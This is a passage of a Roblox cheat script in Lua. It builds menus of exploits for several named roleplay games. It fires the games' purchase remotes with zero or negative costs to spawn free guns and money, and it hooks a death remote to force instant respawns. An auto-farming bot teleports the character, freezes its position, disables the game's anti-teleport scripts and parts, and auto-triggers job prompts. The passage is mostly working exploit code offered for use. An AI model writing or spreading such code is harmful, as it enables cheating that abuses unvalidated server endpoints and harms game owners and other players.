    local keybindButton = Components.CreateButton(contents.SETTINGS, "Current Key: " .. formatKeyName(_G.CurrentKeybind) .. " (Click to Change)", function()
        keybindButton.Text = "Press any key..."
        local listening = true
        local connection
        connection = uis.InputBegan:Connect(function(input, gameProcessed)
            if not listening then
                return
            end
            
            if input.UserInputType == Enum.UserInputType.Keyboard then
                listening = false
                local keyCode = input.KeyCode
                local keyName = formatKeyName(keyCode)
                
                -- Update stored keybind
                _G.CurrentKeybind = keyCode
                keybindButton.Text = "Current Key: " .. keyName .. " (Click to Change)"

                -- Disconnect old keybind connection
                if _G.Key1 then
                    _G.Key1:Disconnect()
                    _G.Key1 = nil
                end
                
                -- Create new keybind connection
                _G.Key1 = uis.InputBegan:Connect(function(inp, gp)
                    if not gp and inp.KeyCode == keyCode then
                        local gui = _G.Gui1
                        if gui and gui.Parent then
                            gui.Enabled = not gui.Enabled
                        else
                            pcall(function()
                                Menu.Build()
                            end)
                        end
                    end
                end)
                
                if connection then
                    connection:Disconnect()
                end
            end
        end)
        
        -- Timeout after 10 seconds if no key is pressed (non-blocking)
        task.spawn(function()
            task.wait(10)
            if listening and connection then
                listening = false
                connection:Disconnect()
                keybindButton.Text = "Current Key: " .. formatKeyName(_G.CurrentKeybind) .. " (Click to Change)"
            end
        end)
    end)
    
    Components.CreateButton(contents["RP MENU"], "TONDO RP MENU", function()
        Components.CreateSimpleRPMenu("TONDO RP", {
            {text = "Spawn Money", callback = function()
                Components.CreateMoneyModal("TONDO RP", function()
                    return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                end, function(amount)
                    return {{Name = "Money", Image = "rbxassetid://0", Tool = "Money", Cost = -amount}}
                end)
            end},
            {text = "Silenced-Pistol", callback = function()
                Components.CreateGunModal("TONDO RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                    end,
                    function(gunName)
                        return {{Name = "Silenced Pistol", Image = "rbxassetid://6026124701", Tool = "Silenced Pistol", Cost = 0}}
                    end,
                    "Silenced Pistol"
                )
            end},
            {text = "HK416", callback = function()
                Components.CreateGunModal("TONDO RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                    end,
                    function(gunName)
                        return {{Name = "HK416", Image = "rbxassetid://8073107221", Tool = "HK416", Cost = 0}}
                    end,
                    "HK416"
                )
            end},
            {text = "Glock-17", callback = function()
                Components.CreateGunModal("TONDO RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                    end,
                    function(gunName)
                        return {{Name = "Glock-17", Image = "rbxassetid://13979677676", Tool = "Glock-17", Cost = 0}}
                    end,
                    "Glock-17"
                )
            end},
            {text = "AK-47", callback = function()
                Components.CreateGunModal("TONDO RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                    end,
                    function(gunName)
                        return {{Name = "AK-47", Image = "rbxassetid://6386163300", Tool = "AK-47", Cost = 0}}
                    end,
                    "AK-47"
                )
            end}
        })
    end)
    
    Components.CreateButton(contents["RP MENU"], "VENERAL RP MENU", function()
        Components.CreateSimpleRPMenu("VENERAL RP", {
            {text = "Silenced-Pistol", callback = function()
                Components.CreateGunModal("VENERAL RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                    end,
                    function(gunName)
                        return {{Name = "Silenced Pistol", Image = "rbxassetid://5189416078", Tool = "Silenced Pistol", Cost = 0}}
                    end,
                    "Silenced Pistol"
                )
            end},
            {text = "Revolver", callback = function()
                Components.CreateGunModal("VENERAL RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                    end,
                    function(gunName)
                        return {{Name = "Revolver", Image = "rbxassetid://5189416078", Tool = "Revolver", Cost = 0}}
                    end,
                    "Revolver"
                )
            end},
            {text = "Oxy", callback = function()
                Components.CreateGunModal("VENERAL RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                    end,
                    function(gunName)
                        return {{Name = "Oxy", Image = "rbxassetid://129157089185691", Tool = "Oxy", Cost = 0}}
                    end,
                    "Oxy"
                )
            end},
            {text = "MEDKIT", callback = function()
                Components.CreateGunModal("VENERAL RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                    end,
                    function(gunName)
                        return {{Name = "MEDKIT", Image = "rbxassetid://5189416078", Tool = "MEDKIT", Cost = 0}}
                    end,
                    "MEDKIT"
                )
            end},
            {text = "Desert Deagle", callback = function()
                Components.CreateGunModal("VENERAL RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                    end,
                    function(gunName)
                        return {{Name = "Desert Deagle", Image = "rbxassetid://5189416078", Tool = "Desert Deagle", Cost = 0}}
                    end,
                    "Desert Deagle"
                )
            end},
            {text = "Glock-17", callback = function()
                Components.CreateGunModal("VENERAL RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                    end,
                    function(gunName)
                        return {{Name = "Glock-17", Image = "rbxassetid://5189416078", Tool = "Glock-17", Cost = 0}}
                    end,
                    "Glock-17"
                )
            end},
            {text = "Spawn Money", callback = function()
                Components.CreateMoneyModal("VENERAL RP", function()
                    return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                end, function(amount)
                    return {{Name = "Money", Image = "rbxassetid://0", Tool = "Money", Cost = -amount}}
                end)
            end}
        })
    end)
    
    Components.CreateButton(contents["RP MENU"], "PROMINENCE RP MENU", function()
        Components.CreateSimpleRPMenu("PROMINENCE RP", {
            {text = "Normal Pistol", callback = function()
                Components.CreateGunModal("PROMINENCE RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyToolEvent")
                    end,
                    function(gunName)
                        return {"Normal Pistol", 0, Player.Name}
                    end,
                    "Normal Pistol"
                )
            end},
            {text = "Combat Pistol", callback = function()
                Components.CreateGunModal("PROMINENCE RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyToolEvent")
                    end,
                    function(gunName)
                        return {"Combat Pistol", 0, Player.Name}
                    end,
                    "Combat Pistol"
                )
            end},
            {text = "Spawn Money", callback = function()
                Components.CreateMoneyModal("PROMINENCE RP", function()
                    return game:GetService("ReplicatedStorage"):WaitForChild("BuyToolEvent")
                end, function(amount)
                    return {"Cash", -amount, Player.Name}
                end)
            end},
            {text = "Spawn Bike", callback = function()
                local args = {"Bike", 0}
            local success = pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("RentCarEvent"):FireServer(unpack(args))
            end)
            if not success then
                    local args2 = {"Bike", -1500}
                pcall(function()
                    game:GetService("ReplicatedStorage"):WaitForChild("RentCarEvent"):FireServer(unpack(args2))
                end)
            end
            end}
        })
    end)
    
    Components.CreateButton(contents["RP MENU"], "BAGONG BARYO RP MENU", function()
        Components.CreateSimpleRPMenu("BAGONG BARYO RP", {
            {text = "Silenced Pistol", callback = function()
                Components.CreateGunModal("BAGONG BARYO RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                    end,
                    function(gunName)
                        return {{
                            Name = "Silenced Pistol",
                            Image = "rbxassetid://135701809459855",
                            Tool = "Silenced Pistol",
                            Cost = -1000
                        }}
                    end,
                    "Silenced Pistol"
                )
            end},
            {text = "Spawn Money", callback = function()
                Components.CreateMoneyModal("BAGONG BARYO RP", function()
                    return game:GetService("ReplicatedStorage"):WaitForChild("BuyItemRemote")
                end, function(amount)
                    return {{Name = "Money", Image = "rbxassetid://0", Tool = "Money", Cost = -amount}}
                end)
            end},
            {text = "Instant Respawn", callback = function()
                local toggleState = _G.BagongBaryoInstantRespawn or false
                toggleState = not toggleState
                _G.BagongBaryoInstantRespawn = toggleState
                
                if toggleState then

                    local function hookDeathRemote()
                        local success, remote = pcall(function()
                            return game:GetService("ReplicatedStorage"):WaitForChild("e805d4a8-51f5-4b01-94ca-03ebcd6f96fd"):WaitForChild("__FUNCTION")
                        end)
                        
                        if success and remote then

                            local originalInvoke = remote.InvokeServer

                            remote.InvokeServer = function(self, ...)
                                local args = {...}

                                if args[1] and type(args[1]) == "table" and args[1].Mode == "Get" then

                                    task.spawn(function()
                                        task.wait(0.1)
                                        Player:LoadCharacter()
                                    end)
                                end
                                return originalInvoke(self, ...)
                            end
                            
                            return true
                        end
                        return false
                    end

                    if hookDeathRemote() then
                    else

                        task.spawn(function()
                            task.wait(2)
                            if hookDeathRemote() then
                            end
                        end)
                    end

                    if Player.Character and Player.Character:FindFirstChild("Humanoid") then
                        local humanoid = Player.Character.Humanoid
                        _G.BagongBaryoHealthHook = humanoid.HealthChanged:Connect(function(health)
                            if health <= 0 and _G.BagongBaryoInstantRespawn then
                                task.wait(0.2)
                                Player:LoadCharacter()
                            end
                        end)
                    end

                    _G.BagongBaryoCharHook = Player.CharacterAdded:Connect(function(character)
                        task.wait(1)
                        local humanoid = character:WaitForChild("Humanoid", 5)
                        if humanoid and _G.BagongBaryoInstantRespawn then
                            if _G.BagongBaryoHealthHook then
                                _G.BagongBaryoHealthHook:Disconnect()
                            end
                            _G.BagongBaryoHealthHook = humanoid.HealthChanged:Connect(function(health)
                                if health <= 0 and _G.BagongBaryoInstantRespawn then
                                    task.wait(0.2)
                                    Player:LoadCharacter()
                                end
                            end)
                        end
                    end)
                else

                    if _G.BagongBaryoHealthHook then
                        _G.BagongBaryoHealthHook:Disconnect()
                        _G.BagongBaryoHealthHook = nil
                    end
                    if _G.BagongBaryoCharHook then
                        _G.BagongBaryoCharHook:Disconnect()
                        _G.BagongBaryoCharHook = nil
                    end

                    pcall(function()
                        local remote = game:GetService("ReplicatedStorage"):WaitForChild("e805d4a8-51f5-4b01-94ca-03ebcd6f96fd"):WaitForChild("__FUNCTION")
                        if remote and remote.InvokeServer then

                        end
                    end)
                end
            end}
        })
    end)
    
    Components.CreateButton(contents["RP MENU"], "KALYE ONSE RP MENU", function()
        Components.CreateSimpleRPMenu("KALYE ONSE RP", {
            {text = "Spawn Money", callback = function()
                Components.CreateMoneyModal("KALYE ONSE RP", function()
                    return game:GetService("ReplicatedStorage"):WaitForChild("MicSystem")
                end, function(amount)
                    return {"Money", -amount}
                end)
            end},
            {text = "Silenced Pistol", callback = function()
                Components.CreateGunModal("KALYE ONSE RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("MicSystem")
                    end,
                    function(gunName)
                        return {"Silenced Pistol", 0}
                    end,
                    "Silenced Pistol"
                )
            end},
            {text = "AmmoBox", callback = function()
                Components.CreateGunModal("KALYE ONSE RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("MicSystem")
                    end,
                    function(gunName)
                        return {"AmmoBox", 0}
                    end,
                    "AmmoBox"
                )
            end},
            {text = "Desert Eagle", callback = function()
                Components.CreateGunModal("KALYE ONSE RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("MicSystem")
                    end,
                    function(gunName)
                        return {"Desert Eagle", 0}
                    end,
                    "Desert Eagle"
                )
            end}
        })
    end)
    
    Components.CreateButton(contents["RP MENU"], "URBAN RP MENU", function()
        Components.CreateSimpleRPMenu("URBAN RP", {
            {text = "Money Spawner", callback = function()
                Components.CreateMoneyModal("URBAN RP", function()
                    return game:GetService("ReplicatedStorage"):WaitForChild("GunStoreFolder"):WaitForChild("BuyTool")
                end, function(amount)
                    return {"Cash", -amount}
                end)
            end},
            {text = "Spawn Deagle", callback = function()
                Components.CreateGunModal("URBAN RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("GunStoreFolder"):WaitForChild("BuyTool")
                    end,
                    function(gunName)
                        return {"Deagle", 0}
                    end,
                    "Deagle"
                )
            end},
            {text = "Spawn Suppressed Pistols", callback = function()
                Components.CreateGunModal("URBAN RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("GunStoreFolder"):WaitForChild("BuyTool")
                    end,
                    function(gunName)
                        return {"Suppressed Pistols", 0}
                    end,
                    "Suppressed Pistols"
                )
            end}
        })
    end)
    
    Components.CreateButton(contents["RP MENU"], "PROVINCE RP MENU", function()
        Components.CreateSimpleRPMenu("PROVINCE RP", {
            {text = "Spawn Money", callback = function()
                Components.CreateMoneyModal("PROVINCE RP", function()
                    return game:GetService("ReplicatedStorage"):WaitForChild("GunShop"):WaitForChild("Events"):WaitForChild("Purchase")
                end, function(amount)
                    return {"Pistol", -amount}
                end)
            end},
            {text = "Spawn Pistol", callback = function()
                Components.CreateGunModal("PROVINCE RP",
                    function()
                        return game:GetService("ReplicatedStorage"):WaitForChild("GunShop"):WaitForChild("Events"):WaitForChild("Purchase")
                    end,
                    function(gunName)
                        return {"Pistol", 0}
                    end,
                    "Pistol"
                )
            end}
        })
    end)

    Components.CreateButton(contents["RP MENU"], "DOMINION RP MENU", function()
        Components.CreateSimpleRPMenu("DOMINION RP", {
            {text = "AUTO-CS", callback = function()

                local rs = game:GetService("RunService")
                local uis = game:GetService("UserInputService")
                local lp = game:GetService("Players").LocalPlayer
                local pg = lp:WaitForChild("PlayerGui")

                local HOLD_DURATION = 5
                local COOLDOWN = 3.5
                local ACTION_TEXT = "Clean"
                local OBJECT_TEXT = "Trash"

                local cleanPartsCache = {}
                local cacheUpdateTime = 0
                local CACHE_DURATION = 3

                local rpGui = Instance.new("ScreenGui")
                rpGui.Name = math.random(10000,99999)
                rpGui.ResetOnSpawn = false
                rpGui.Parent = pg
                
                local modal = Instance.new("Frame")
                modal.Size = UDim2.new(0, 300, 0, 130)
                modal.Position = UDim2.new(0.5, -150, 0.5, -65)
                modal.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                modal.BorderSizePixel = 0
                modal.Parent = rpGui
                Utils.RoundCorners(modal, 12)
                Utils.MakeDraggable(modal)

                local titleLabel = Instance.new("TextLabel")
                titleLabel.Size = UDim2.new(1, -40, 0, 40)
                titleLabel.Position = UDim2.new(0, 10, 0, 10)
                titleLabel.BackgroundTransparency = 1
                titleLabel.Text = "DOMINION RP"
                titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                titleLabel.TextSize = 16
                titleLabel.Font = Enum.Font.GothamBold
                titleLabel.TextXAlignment = Enum.TextXAlignment.Left
                titleLabel.Parent = modal

                local closeBtn = Instance.new("TextButton")
                closeBtn.Size = UDim2.new(0, 30, 0, 30)
                closeBtn.Position = UDim2.new(1, -35, 0, 10)
                closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                closeBtn.Text = "X"
                closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                closeBtn.TextSize = 14
                closeBtn.Font = Enum.Font.GothamBold
                closeBtn.BorderSizePixel = 0
                closeBtn.Parent = modal
                Utils.RoundCorners(closeBtn, 8)
                closeBtn.MouseButton1Click:Connect(function()
                    rpGui:Destroy()
                end)

                local trashCountLabel = Instance.new("TextLabel")
                trashCountLabel.Size = UDim2.new(1, -20, 0, 25)
                trashCountLabel.Position = UDim2.new(0, 10, 0, 50)
                trashCountLabel.BackgroundTransparency = 1
                trashCountLabel.Text = "TRASH FOUND: 0"
                trashCountLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
                trashCountLabel.TextSize = 12
                trashCountLabel.Font = Enum.Font.Gotham
                trashCountLabel.TextXAlignment = Enum.TextXAlignment.Left
                trashCountLabel.Parent = modal

                local trashCount = 0

                local toggleBtn = Instance.new("TextButton")
                toggleBtn.Size = UDim2.new(1, -20, 0, 30)
                toggleBtn.Position = UDim2.new(0, 10, 0, 80)
                toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                toggleBtn.Text = "EXECUTE"
                toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                toggleBtn.TextSize = 12
                toggleBtn.Font = Enum.Font.Gotham
                toggleBtn.BorderSizePixel = 0
                toggleBtn.Parent = modal
                Utils.RoundCorners(toggleBtn, 6)

                local statusLabel = {Text = "", TextColor3 = Color3.fromRGB(255, 255, 255)}

                local function getCleanPartPosition(cleanPart)
                    if not cleanPart then return nil, nil end
                    if cleanPart:IsA("BasePart") then
                        return cleanPart.Position, cleanPart.CFrame
                    elseif cleanPart:IsA("Model") then
                        local primaryPart = cleanPart.PrimaryPart or cleanPart:FindFirstChild("HumanoidRootPart")
                        if primaryPart then
                            return primaryPart.Position, primaryPart.CFrame
                        end
                    end
                    return nil, nil
                end
                
                local function findAllCleanParts()
                    local cleanParts = {}

                    local comService = workspace:FindFirstChild("ComService")
                    if comService then
                        local cleanFolder = comService:FindFirstChild("CleanFolder")
                        if cleanFolder then
                            for _, obj in pairs(cleanFolder:GetChildren()) do
                                if obj.Name == "CleanPart" then
                                    local prompt = obj:FindFirstChild("ProximityPrompt")
                                    if prompt and prompt:IsA("ProximityPrompt") then
                                        if prompt.ActionText == ACTION_TEXT or prompt.ActionText == "Clean" then
                                            if prompt.ObjectText == OBJECT_TEXT or prompt.ObjectText == "Trash" then
                                                table.insert(cleanParts, {part = obj, prompt = prompt})
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end

                    if #cleanParts == 0 then
                        for _, obj in pairs(workspace:GetDescendants()) do
                            if obj.Name == "CleanPart" then
                                local prompt = obj:FindFirstChild("ProximityPrompt")
                                if prompt and prompt:IsA("ProximityPrompt") then
                                    if prompt.ActionText == ACTION_TEXT or prompt.ActionText == "Clean" then
                                        if prompt.ObjectText == OBJECT_TEXT or prompt.ObjectText == "Trash" then
                                            table.insert(cleanParts, {part = obj, prompt = prompt})
                                        end
                                    end
                                end
                            end
                        end
                    end

                    if #cleanParts == 0 then
                        for _, obj in pairs(workspace:GetDescendants()) do
                            if obj:IsA("ProximityPrompt") then

                                local actionMatch = obj.ActionText == ACTION_TEXT or 
                                                   obj.ActionText == "Clean" or 
                                                   obj.ActionText:match("Clean") or
                                                   obj.ActionText == "Trash Clean"

                                local objectMatch = obj.ObjectText == OBJECT_TEXT or 
                                                   obj.ObjectText == "Trash" or
                                                   obj.ObjectText == "" or
                                                   obj.ObjectText == nil
                                
                                if actionMatch and (objectMatch or obj.ObjectText == nil) then

                                    if obj.Parent and (obj.Parent:IsA("BasePart") or obj.Parent:IsA("Model")) then
                                        table.insert(cleanParts, {part = obj.Parent, prompt = obj})
                                    end
                                end
                            end
                        end
                    end

                    if #cleanParts == 0 then
                        for _, obj in pairs(workspace:GetDescendants()) do
                            if obj.Name == "Trash" or obj.Name:match("Trash") then
                                local prompt = obj:FindFirstChild("ProximityPrompt")
                                if prompt and prompt:IsA("ProximityPrompt") then

                                    if prompt.ActionText and prompt.ActionText:match("Clean") then
                                        table.insert(cleanParts, {part = obj, prompt = prompt})
                                    end
                                end
                            end
                        end
                    end
                    
                    return cleanParts
                end
                
                local function getCachedCleanParts()
                    local currentTime = tick()

                    if #cleanPartsCache == 0 or (currentTime - cacheUpdateTime) >= CACHE_DURATION then
                        cleanPartsCache = findAllCleanParts()
                        cacheUpdateTime = currentTime
                    end

                    local validParts = {}
                    for _, data in pairs(cleanPartsCache) do

                        if data.part and data.part.Parent then
                            if data.prompt and data.prompt.Parent == data.part then

                                if data.prompt:IsA("ProximityPrompt") and data.prompt.Enabled then
                                    table.insert(validParts, data)
                                end
                            elseif data.prompt and data.prompt.Parent then

                                table.insert(validParts, {part = data.prompt.Parent, prompt = data.prompt})
                            end
                        end
                    end

                    if #validParts == 0 and #cleanPartsCache > 0 then
                        cleanPartsCache = findAllCleanParts()
                        cacheUpdateTime = currentTime
                        validParts = cleanPartsCache
                    else
                        cleanPartsCache = validParts
                    end
                    
                    return cleanPartsCache
                end
                
                local function getPrioritizedCleanParts(processedParts, currentTime)
                    local allParts = getCachedCleanParts()
                    if #allParts == 0 then return {} end
                    local playerPos = nil
                    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
                        playerPos = lp.Character.HumanoidRootPart.Position
                    end
                    local availableParts = {}
                    local cooldownParts = {}
                    for _, data in pairs(allParts) do
                        local partId = tostring(data.part)
                        local lastHold = processedParts[partId] or 0
                        local timeSinceHold = currentTime - lastHold
                        local distance = 0
                        if playerPos then
                            local partPos, _ = getCleanPartPosition(data.part)
                            if partPos then
                                distance = (playerPos - partPos).Magnitude
                            end
                        end
                        if timeSinceHold >= COOLDOWN then
                            table.insert(availableParts, {data = data, distance = distance})
                        else
                            table.insert(cooldownParts, {data = data, distance = distance, waitTime = COOLDOWN - timeSinceHold})
                        end
                    end
                    table.sort(availableParts, function(a, b) return a.distance < b.distance end)
                    table.sort(cooldownParts, function(a, b) return a.waitTime < b.waitTime end)
                    local prioritized = {}
                    for _, item in pairs(availableParts) do
                        table.insert(prioritized, item.data)
                    end
                    for _, item in pairs(cooldownParts) do
                        table.insert(prioritized, item.data)
                    end
                    return prioritized
                end

                local positionLockConnection = nil
                local heartbeatConnection = nil
                local lockedPosition = nil
                local lockedCleanPart = nil
                
                local function startPositionLock(cleanPart)
                    if positionLockConnection then positionLockConnection:Disconnect() end
                    if heartbeatConnection then heartbeatConnection:Disconnect() end
                    if not cleanPart or not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return false end
                    local hrp = lp.Character.HumanoidRootPart
                    local partPosition, _ = getCleanPartPosition(cleanPart)
                    if not partPosition then return false end
                    local offset = Vector3.new(0, 2, 0)
                    lockedPosition = partPosition + offset
                    lockedCleanPart = cleanPart
                    hrp.CFrame = CFrame.new(lockedPosition)
                    hrp.AssemblyLinearVelocity = Vector3.new()
                    positionLockConnection = rs.RenderStepped:Connect(function()
                        if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return end
                        local hrp = lp.Character.HumanoidRootPart
                        if lockedCleanPart then
                            local partPos, _ = getCleanPartPosition(lockedCleanPart)
                            if partPos then
                                lockedPosition = partPos + Vector3.new(0, 2, 0)
                            end
                        end
                        if lockedPosition then
                            hrp.CFrame = CFrame.new(lockedPosition)
                            hrp.AssemblyLinearVelocity = Vector3.new()
                            hrp.Velocity = Vector3.new()
                            hrp.AssemblyAngularVelocity = Vector3.new()
                            hrp.RotVelocity = Vector3.new()
                        end
                    end)
                    heartbeatConnection = rs.Heartbeat:Connect(function()
                        if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return end
                        local hrp = lp.Character.HumanoidRootPart
                        if lockedPosition then
                            local currentDistance = (hrp.Position - lockedPosition).Magnitude
                            if currentDistance > 1 then
                                hrp.CFrame = CFrame.new(lockedPosition)
                                hrp.AssemblyLinearVelocity = Vector3.new()
                                hrp.Velocity = Vector3.new()
                            end
                        end
                    end)
                    return true
                end
                
                local function stopPositionLock()
                    if positionLockConnection then positionLockConnection:Disconnect() positionLockConnection = nil end
                    if heartbeatConnection then heartbeatConnection:Disconnect() heartbeatConnection = nil end
                    lockedPosition = nil
                    lockedCleanPart = nil
                end

                local tpBypassConnection = nil
                local tpBypassRunning = false
                local tpPartsDisabled = {}
                
                local function bypassTPFolder()

                    local tpFolder = workspace:FindFirstChild("TP")
                    if not tpFolder then return end
                    
                    tpBypassRunning = true

                    local function disableTPParts()
                        for _, obj in pairs(tpFolder:GetDescendants()) do
                            if obj:IsA("BasePart") then

                                pcall(function()
                                    obj.CanCollide = false
                                    obj.Transparency = 1
                                    obj.CollisionGroupId = 0

                                    if obj:IsDescendantOf(tpFolder) then
                                        tpPartsDisabled[obj] = true
                                    end
                                end)

                                pcall(function()
                                    obj.Touched:Connect(function(hit)

                                        if hit.Parent == lp.Character then

                                            return
                                        end
                                    end)
                                end)
                            elseif obj:IsA("Script") or obj:IsA("LocalScript") then
                                pcall(function()
                                    obj.Disabled = true
                                end)
                            end
                        end
                    end

                    disableTPParts()

                    if tpBypassConnection then
                        tpBypassConnection:Disconnect()
                    end
                    
                    tpBypassConnection = tpFolder.DescendantAdded:Connect(function(obj)
                        if obj:IsA("BasePart") then
                            pcall(function()
                                obj.CanCollide = false
                                obj.Transparency = 1
                                obj.CollisionGroupId = 0
                                tpPartsDisabled[obj] = true
                            end)

                            pcall(function()
                                obj.Touched:Connect(function(hit)
                                    if hit.Parent == lp.Character then
                                        return
                                    end
                                end)
                            end)
                        elseif obj:IsA("Script") or obj:IsA("LocalScript") then
                            pcall(function()
                                obj.Disabled = true
                            end)
                        end
                    end)

                    task.spawn(function()
                        while tpBypassRunning do
                            disableTPParts()
                            task.wait(0.5)
                        end
                    end)
                end
                
                local function cleanupTPBypass()
                    tpBypassRunning = false
                    if tpBypassConnection then
                        tpBypassConnection:Disconnect()
                        tpBypassConnection = nil
                    end
                    tpPartsDisabled = {}
                end

                local function autoHoldPrompt(prompt, cleanPart, statusLabel)
                    if not prompt then return false end

                    local actualHoldDuration = prompt.HoldDuration or HOLD_DURATION
                    if actualHoldDuration < 3 then
                        actualHoldDuration = 3
                    end

                    pcall(function()
                        prompt.MaxActivationDistance = 10000
                        prompt.RequiresLineOfSight = false
                        prompt.Enabled = true
                    end)


                    local success = false

                    local success1, err1 = pcall(function()
                        statusLabel.Text = "Status: HOLDING..."
                        statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)

                        prompt:InputHoldBegin()

                        local holdTime = 0
                        local holdSteps = math.ceil(actualHoldDuration / 0.02)
                        
                        for i = 1, holdSteps do
                            if not prompt or not prompt.Parent then break end
                            
                            prompt:InputHoldBegin()
                            task.wait(0.02)
                            holdTime = holdTime + 0.02
                        end

                        if holdTime < actualHoldDuration then
                            local remainingSteps = math.ceil((actualHoldDuration - holdTime) / 0.02)
                            for i = 1, remainingSteps do
                                if not prompt or not prompt.Parent then break end
                                prompt:InputHoldBegin()
                                task.wait(0.02)
                                holdTime = holdTime + 0.02
                            end
                        end
                        
                        task.wait(0.05)
                        success = true
                    end)

                    if not success then
                        task.wait(0.1)
                        local success2, err2 = pcall(function()
                            statusLabel.Text = "Status: Trying click method..."
                            statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)

                            for i = 1, 5 do
                                prompt:PromptButtonClicked()
                                task.wait(0.5)
                            end
                            
                            success = true
                        end)
                    end

                    if not success then
                        task.wait(0.1)
                        local success3, err3 = pcall(function()
                            statusLabel.Text = "Status: Trying event method..."
                            statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)

                            local event = prompt:GetPropertyChangedSignal("PromptButtonHoldBegan")
                            if event then
                                event:Fire()

                                for i = 1, math.ceil(actualHoldDuration / 0.02) do
                                    if not prompt or not prompt.Parent then break end
                                    prompt:InputHoldBegin()
                                    task.wait(0.02)
                                end

                            end
                            
                            success = true
                        end)
                    end
                    
                    if success then
                        statusLabel.Text = "Status: Hold complete!"
                        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                    else
                        statusLabel.Text = "Status: Failed to hold!"
                        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                    end
                    
                    return success
                end

                local function autoHoldLoop(statusLabel, isRunning)
                    local processedParts = {}
                    local currentCleanPart = nil
                    local currentPrompt = nil
                    while isRunning() do
                        if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then
                            statusLabel.Text = "Status: Character not found!"
                            statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                            task.wait(1)
                        else
                            local currentTime = tick()
                            local cleanParts = getPrioritizedCleanParts(processedParts, currentTime)
                            if #cleanParts == 0 then
                                cleanPartsCache = {}
                                cacheUpdateTime = 0
                                statusLabel.Text = "Status: No CleanParts found! Searching..."
                                statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                                task.wait(1)
                            else
                                if not currentCleanPart or not currentPrompt then
                                    local data = cleanParts[1]
                                    if data and data.prompt and data.prompt.Parent == data.part then
                                        currentCleanPart = data.part
                                        currentPrompt = data.prompt
                                        startPositionLock(currentCleanPart)
                                        task.wait(0.3)
                                        statusLabel.Text = "Status: Ready..."
                                        statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
                                    else
                                        cleanPartsCache = {}
                                        cacheUpdateTime = 0
                                        currentCleanPart = nil
                                        currentPrompt = nil
                                        task.wait(0.1)
                                    end
                                end
                                if currentCleanPart and currentPrompt then
                                    if not currentPrompt.Parent or currentPrompt.Parent ~= currentCleanPart then
                                        stopPositionLock()
                                        currentCleanPart = nil
                                        currentPrompt = nil
                                        statusLabel.Text = "Status: Finding next..."
                                        statusLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
                                        task.wait(0.2)
                                    else
                                        if lockedCleanPart ~= currentCleanPart then
                                            startPositionLock(currentCleanPart)
                                            task.wait(0.3)
                                        end
                                        local currentTime = tick()
                                        local partId = tostring(currentCleanPart)
                                        local lastHold = processedParts[partId] or 0
                                        if currentTime - lastHold >= COOLDOWN then
                                            statusLabel.Text = "Status: Holding CleanPart..."
                                            statusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
                                            local success = autoHoldPrompt(currentPrompt, currentCleanPart, statusLabel)
                                            if success then
                                                processedParts[partId] = currentTime

                                                trashCount = trashCount + 1
                                                trashCountLabel.Text = "TRASH FOUND: " .. trashCount
                                                statusLabel.Text = "Status: SUCCESS!"
                                                statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                                                task.wait(0.5)
                                                stopPositionLock()
                                                currentCleanPart = nil
                                                currentPrompt = nil
                                                statusLabel.Text = "STATUS: IDLE"
                                                statusLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
                                                task.wait(0.2)
                                            else
                                                statusLabel.Text = "STATUS: RETRYING"
                                                statusLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
                                                task.wait(0.5)
                                            end
                                        else
                                            statusLabel.Text = "STATUS: WAITING"
                                            statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
                                        end
                                    end
                                end
                            end
                        end
                        task.wait(0.05)
                    end
                end

                local isRunning = false
                lp.CharacterAdded:Connect(function(character)
